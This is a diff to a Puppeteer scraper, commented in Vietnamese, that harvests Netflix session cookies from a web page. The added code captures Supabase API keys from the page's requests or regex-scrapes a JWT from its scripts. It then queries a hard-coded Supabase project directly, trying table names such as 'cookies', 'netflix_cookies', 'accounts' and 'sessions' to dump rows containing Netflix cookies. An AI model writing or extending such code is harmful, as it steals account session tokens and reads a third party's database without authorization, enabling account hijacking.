@@ -283,8 +283,25 @@ async function scrapeViaPuppeteer(country) {
     await page.setViewport({ width: 1440, height: 900 });
     await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36');
 
-    // ── Bắt toàn bộ network responses ────────────────────────────────────
+    // ── Bắt toàn bộ network responses + intercept Supabase headers ───────
     const networkTexts = [];
+    let supabaseKey = null;
+    let supabaseUrl = null;
+
+    page.on('request', (req) => {
+      try {
+        const url = req.url();
+        if (url.includes('supabase')) {
+          const headers = req.headers();
+          if (headers['apikey']) {
+            supabaseKey = headers['apikey'];
+            supabaseUrl = url.split('/rest/')[0];
+            console.log(`[Supabase] URL=${supabaseUrl} key=${supabaseKey.slice(0, 30)}...`);
+          }
+        }
+      } catch {}
+    });
+
     page.on('response', async (response) => {
       try {
         const url = response.url();
@@ -295,9 +312,9 @@ async function scrapeViaPuppeteer(country) {
         if (!ct.includes('json') && !ct.includes('text')) return;
         const text = await response.text();
         if (text.length < 20) return;
-        // Log tất cả responses có nội dung đáng chú ý
-        if (text.length > 100) {
-          console.log(`[Network] ${url.slice(0, 100)} (${text.length}b, hasNF=${text.includes('netflix')})`);
+        // Log Supabase responses
+        if (url.includes('supabase')) {
+          console.log(`[Supabase Response] ${url.slice(0, 120)} → ${text.slice(0, 200)}`);
         }
         if (looksLikeNetflixData(text)) {
           console.log(`[Network Hit] ${url.slice(0, 100)}`);
@@ -339,6 +356,45 @@ async function scrapeViaPuppeteer(country) {
       );
     } catch { console.log('[Tầng 3] waitForFunction timeout — tiếp tục...'); }
     await sleep(3000);
+
+    // ── Tìm Supabase key từ JS source của trang ───────────────────────────
+    if (!supabaseKey) {
+      const extractedKey = await page.evaluate(() => {
+        const scripts = [...document.querySelectorAll('script')].map(s => s.textContent || '');
+        const allJs = scripts.join('\n');
+        const m = allJs.match(/eyJ[A-Za-z0-9_\-]{100,}/);
+        return m ? m[0] : null;
+      });
+      if (extractedKey) {
+        supabaseKey = extractedKey;
+        supabaseUrl = 'https://qpjgbyitbrguzoqzqumh.supabase.co';
+        console.log(`[Supabase] Key từ JS: ${supabaseKey.slice(0, 50)}...`);
+      } else {
+        console.log('[Supabase] Không tìm thấy key trong script tags — thử JS files...');
+      }
+    }
+
+    // ── Gọi thẳng Supabase API nếu có key ────────────────────────────────
+    if (supabaseKey) {
+      console.log('[Supabase] Đang query database...');
+      for (const table of ['cookies', 'cookie', 'netflix_cookies', 'accounts', 'sessions', 'data']) {
+        try {
+          const r = await axios.get(
+            `https://qpjgbyitbrguzoqzqumh.supabase.co/rest/v1/${table}?select=*&limit=10`,
+            { headers: { 'apikey': supabaseKey, 'Authorization': `Bearer ${supabaseKey}` }, timeout: 10000 }
+          );
+          console.log(`[Supabase] ${table} → ${JSON.stringify(r.data).slice(0, 300)}`);
+          if (Array.isArray(r.data) && r.data.length) {
+            for (const row of r.data) {
+              const val = Object.values(row).find(v => typeof v === 'string' && v.includes('netflix.com'));
+              if (val) networkTexts.push(val);
+            }
+          }
+        } catch (e) {
+          console.log(`[Supabase] ${table} → ${e.response?.status || e.message}`);
+        }
+      }
+    }
 
     // ── Helper: Hút cookie từ DOM hiện tại + bên trong iframes ──────────
     const collectDomTexts = async () => {
@@ -562,6 +618,37 @@ async function scrapeViaPuppeteer(country) {
 
     // ── Thu thập clipboard ────────────────────────────────────────────────
     const copiedTexts = await page.evaluate(() => window.__copiedTexts || []);
+
+    // ── Nếu có Supabase key → gọi thẳng API lấy cookies ─────────────────
+    if (supabaseKey && supabaseUrl && !networkTexts.length) {
+      console.log('[Supabase] Thử gọi trực tiếp API lấy cookies...');
+      try {
+        const cookieRes = await axios.get(`${supabaseUrl}/rest/v1/cookies?select=*&limit=20`, {
+          headers: { 'apikey': supabaseKey, 'Authorization': `Bearer ${supabaseKey}` },
+          timeout: 15000,
+        });
+        console.log(`[Supabase] cookies table: ${JSON.stringify(cookieRes.data).slice(0, 300)}`);
+        const rows = cookieRes.data;
+        if (Array.isArray(rows)) {
+          for (const row of rows) {
+            const val = Object.values(row).find(v => typeof v === 'string' && v.includes('netflix.com'));
+            if (val) networkTexts.push(val);
+          }
+        }
+      } catch (e) {
+        console.log(`[Supabase] cookies table error: ${e.message}`);
+        // Thử tên bảng khác
+        for (const table of ['cookie', 'netflix_cookies', 'accounts', 'sessions', 'data']) {
+          try {
+            const r = await axios.get(`${supabaseUrl}/rest/v1/${table}?select=*&limit=5`, {
+              headers: { 'apikey': supabaseKey, 'Authorization': `Bearer ${supabaseKey}` },
+              timeout: 10000,
+            });
+            console.log(`[Supabase] ${table}: ${JSON.stringify(r.data).slice(0, 200)}`);
+          } catch {}
+        }
+      }
+    }
 
     const all = [...new Set([...copiedTexts, ...allDomTexts, ...networkTexts])];
     console.log(`[Tầng 3] clipboard=${copiedTexts.length} dom=${allDomTexts.length} network=${networkTexts.length} total=${all.length}`);
